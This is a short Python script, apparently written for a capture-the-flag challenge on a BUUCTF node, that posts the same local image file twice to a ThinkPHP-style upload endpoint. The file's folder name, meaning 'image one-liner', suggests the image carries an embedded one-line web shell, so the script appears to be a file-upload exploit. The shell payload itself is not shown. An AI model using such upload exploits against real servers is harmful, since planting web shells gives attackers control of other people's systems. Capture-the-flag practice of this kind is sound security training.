import requests


url = 'http://a7980ec5-44e6-4766-81f9-89cbca678049.node3.buuoj.cn/index.php?s=/Home/index/upload'

files_1 = {
    'file':open('D:\cpan\桌面\图片一句话\小图片.jpg','rb')
}

r = requests.post(url=url,files=files_1)

print(r.text)
files_2 = {
    'file':open('D:\cpan\桌面\图片一句话\小图片.jpg','rb')
}
z = requests.post(url=url,files=files_2)
print(z.text)